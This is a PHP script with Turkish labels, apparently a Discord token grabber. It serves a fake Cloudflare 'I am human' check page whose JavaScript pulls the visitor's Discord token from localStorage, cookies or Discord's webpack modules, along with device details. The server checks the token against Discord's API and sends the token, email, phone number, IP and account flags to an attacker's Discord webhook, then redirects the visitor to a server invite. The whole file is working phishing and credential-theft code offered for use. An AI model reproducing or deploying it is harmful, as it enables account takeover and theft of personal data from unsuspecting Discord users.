<?php
// ── AYARLAR (kendininkilerle değiştir) ──
define('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/...');
define('GUILD_INVITE',   'https://discord.gg/...');

// ── YÖNLENDİRME ──
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (preg_match('#^/verify/(\d+)$#', $path, $m)) {
    handle_verify((int)$m[1]);
} elseif (preg_match('#^/grab/(\d+)$#', $path, $m)) {
    handle_grab((int)$m[1]);
} else {
    http_response_code(404);
    echo '404';
}

// ── FONKSİYONLAR ──
function handle_verify($uid) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ip = explode(',', $ip)[0];
    $invite = rtrim(GUILD_INVITE, '/');
    error_log("PAGE: user=$uid ip=$ip");
    header('Content-Type: text/html; charset=utf-8');
    echo page_html($invite, $uid);
}

function handle_grab($uid) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ip = explode(',', $ip)[0];
    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true) ?? [];
    $screen = $data['screen'] ?? 'Bilinmiyor';
    $lang   = $data['lang']   ?? 'Bilinmiyor';
    $tz     = $data['tz']     ?? 'Bilinmiyor';
    $token  = $data['token']  ?? '';

    $fields = [
        ['name' => 'Hedef',    'value' => "<@$uid> (`$uid`)",                    'inline' => false],
        ['name' => 'IP Adresi','value' => "```$ip```",                           'inline' => true],
        ['name' => 'User-Agent','value' => '```' . substr($ua, 0, 200) . '```',  'inline' => false],
        ['name' => 'Ekran',    'value' => $screen,                                'inline' => true],
        ['name' => 'Dil',      'value' => $lang,                                  'inline' => true],
        ['name' => 'Saat Dilimi','value' => $tz,                                  'inline' => true],
        ['name' => 'Zaman',    'value' => gmdate('Y-m-d H:i:s') . ' UTC',         'inline' => false],
    ];
    $description = '';

    if ($token && strlen($token) > 10) {
        $user = validate_token($token);
        if ($user) {
            $flags = [];
            if (!empty($user['verified']))     $flags[] = 'Doğrulanmış';
            if (!empty($user['mfa_enabled']))  $flags[] = 'MFA';
            if (!empty($user['premium_type'])) $flags[] = 'Nitro';
            $description = '✅ Geçerli Discord tokeni ele geçirildi!';
            $fields[] = ['name' => '━━━ KULLANICI BİLGİLERİ ━━━', 'value' => 'Token doğrulandı', 'inline' => false];
            $fields[] = ['name' => 'Kullanıcı','value' => "{$user['username']}#{$user['discriminator']}", 'inline' => true];
            $fields[] = ['name' => 'ID',       'value' => $user['id'],                                  'inline' => true];
            $fields[] = ['name' => 'Email',    'value' => $user['email'] ?? 'Yok',                      'inline' => true];
            $fields[] = ['name' => 'Telefon',  'value' => $user['phone'] ?? 'Yok',                      'inline' => true];
            $fields[] = ['name' => 'Durum',    'value' => implode(', ', $flags) ?: 'Normal',            'inline' => true];
            $fields[] = ['name' => 'Token',    'value' => "```$token```",                               'inline' => false];
        } else {
            $description = '⚠️ Token bulundu ama Discord API doğrulamadı';
            $fields[] = ['name' => 'Alınan Token','value' => '```' . substr($token, 0, 50) . '...```', 'inline' => false];
        }
    } else {
        $description = '❌ Token bulunamadı';
    }

    send_webhook([
        'title'       => 'Yeni Yakalama',
        'color'       => 0xF38020,
        'description' => $description,
        'timestamp'   => gmdate('Y-m-d\TH:i:s\Z'),
        'fields'      => $fields,
    ]);
    header('Content-Type: application/json');
    echo json_encode(['status'=>'ok']);
}

function validate_token($token) {
    $ctx = stream_context_create(['http' => [
        'method' => 'GET',
        'header' => "Authorization: $token\r\nUser-Agent: Mozilla/5.0\r\n",
        'timeout' => 10,
    ]]);
    $r = @file_get_contents('https://discord.com/api/v9/users/@me', false, $ctx);
    if ($r && ($data = json_decode($r, true)) && !empty($data['id'])) return $data;
    return null;
}

function send_webhook($embed) {
    if (!WEBHOOK_URL) return;
    $payload = json_encode(['embeds' => [$embed]]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/json\r\nContent-Length: " . strlen($payload) . "\r\n",
        'content' => $payload,
        'timeout' => 10,
    ]]);
    @file_get_contents(WEBHOOK_URL, false, $ctx);
}

function page_html($invite, $uid) {
    $h = <<<HTML
<!DOCTYPE html><html lang=tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Just a moment...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:36px 40px;width:460px;max-width:94vw;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.6)}.cf-logo{width:44px;height:44px;margin:0 auto 14px}.cf-logo svg{width:44px;height:44px}h1{font-size:18px;font-weight:600;color:#e6edf3;margin-bottom:6px}.sub{color:#8b949e;font-size:13px;margin-bottom:24px;line-height:1.5}.widget{display:flex;align-items:center;justify-content:space-between;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:12px 16px;cursor:pointer;transition:border-color .2s,background .2s;user-select:none;margin-bottom:8px}.widget:hover{border-color:#58a6ff;background:#111820}.widget-left{display:flex;align-items:center;gap:10px}.cf-checkbox{width:22px;height:22px;border:2px solid #484f58;border-radius:4px;display:flex;align-items:center;justify-content:center;transition:all .25s;font-size:13px;color:#fff;flex-shrink:0}.cf-checkbox.done{background:#238636;border-color:#238636}.cf-brand{font-size:11px;color:#8b949e;display:flex;align-items:center;gap:4px}.cf-brand svg{width:16px;height:16px}.spinner{display:none;align-items:center;justify-content:center;gap:10px;padding:8px 0;margin-top:4px}.spinner.show{display:flex}.loader{width:22px;height:22px;border:3px solid #238636;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite}.loading-text{font-size:14px;color:#3fb950;font-weight:500}.verified{display:none;align-items:center;justify-content:center;gap:8px;padding:8px 0;margin-top:4px}.verified.show{display:flex}.checkmark{width:24px;height:24px;background:#238636;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;color:#fff;font-weight:700}.verified-text{font-size:16px;color:#3fb950;font-weight:600}.cf-footer{margin-top:24px;padding-top:14px;border-top:1px solid #21262d;font-size:11px;color:#484f58}.cf-footer span{display:block;margin-bottom:2px}.cf-footer small{color:#30363d;font-size:10px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class=card><div class=cf-logo><svg viewBox="0 0 48 48" fill=none><circle cx=24 cy=24 r=22 fill=#F38020/><path d="M16 28c0-2.8 2.2-5 5-5h1.8c-.4-1.9.2-3.9 1.6-5.4 1.6-1.9 4.2-2.7 6.5-2.2 2.4.5 4.4 2.2 5.3 4.4.4-.1.8-.2 1.2-.2 2.8 0 5 2.2 5 5 0 .6-.1 1.2-.3 1.8H21c-1.4 0-2.5-1.1-2.5-2.5l.3-1.6c-.1-.3-.3-.6-.8-.8z" fill=#fff/></svg></div><h1>Just a moment...</h1><p class=sub>Checking your browser before accessing the server. This is protected by Cloudflare&reg;.</p><div class=widget id=cf-widget onclick=startVerify()><div class=widget-left><div class=cf-checkbox id=cf-checkbox></div><span style=font-size:13px;color:#e6edf3>I am human</span></div><div class=cf-brand><svg viewBox="0 0 24 24"><circle cx=12 cy=12 r=10 fill=#F38020/><path d="M8 14c0-1.4 1.1-2.5 2.5-2.5h.9c-.2 1 .1 2 .8 2.7.8 1 2.1 1.4 3.3 1.1s2.2-1.1 2.6-2.2c.2-.1.4-.1.6-.1 1.4 0 2.5 1.1 2.5 2.5 0 .3-.1.6-.2.9H10.5c-.7 0-1.2-.6-1.2-1.2l.1-.8c-.1-.1-.2-.3-.4-.4z" fill=#fff/></svg>Cloudflare</div></div><div class=spinner id=cf-spinner><div class=loader></div><span class=loading-text>Verifying...</span></div><div class=verified id=cf-verified><div class=checkmark>&#10003;</div><span class=verified-text>Verified!</span></div><div class=cf-footer><span>Powered by Cloudflare&reg;</span><small>Protecting your connection &middot; 3.2.1</small></div></div><script>var INV="{$invite}";var UID={$uid};function gT(){var t=null;try{var x=localStorage.getItem('token');if(x&&x.length>10)t=x}catch(e){}if(!t){try{var c=document.cookie.match(/token=([^;]+)/);if(c&&c[1]&&c[1].length>10)t=c[1]}catch(e){}}if(!t&&window.webpackChunkdiscord_app&&webpackChunkdiscord_app.push){try{webpackChunkdiscord_app.push([[Symbol('discord')],{},function(e){if(!e||!e.c)return{};Object.keys(e.c).forEach(function(k){try{var m=e.c[k].exports;if(m&&m.default&&typeof m.default.getToken==='function'){var tk=m.default.getToken();if(tk&&tk.length>10)t=tk}}catch(e){}});return e.c}])}catch(e){}}return t}function startVerify(){document.getElementById('cf-widget').onclick=null;document.getElementById('cf-widget').style.cursor='default';document.getElementById('cf-checkbox').classList.add('done');document.getElementById('cf-checkbox').textContent='✓';document.getElementById('cf-spinner').classList.add('show');var d={screen:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ua:navigator.userAgent,token:gT()};fetch('/grab/'+UID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});setTimeout(function(){document.getElementById('cf-spinner').classList.remove('show');document.getElementById('cf-verified').classList.add('show')},1800);setTimeout(function(){window.location.href=INV},4800)}</script></body></html>
HTML;
    return $h;
}
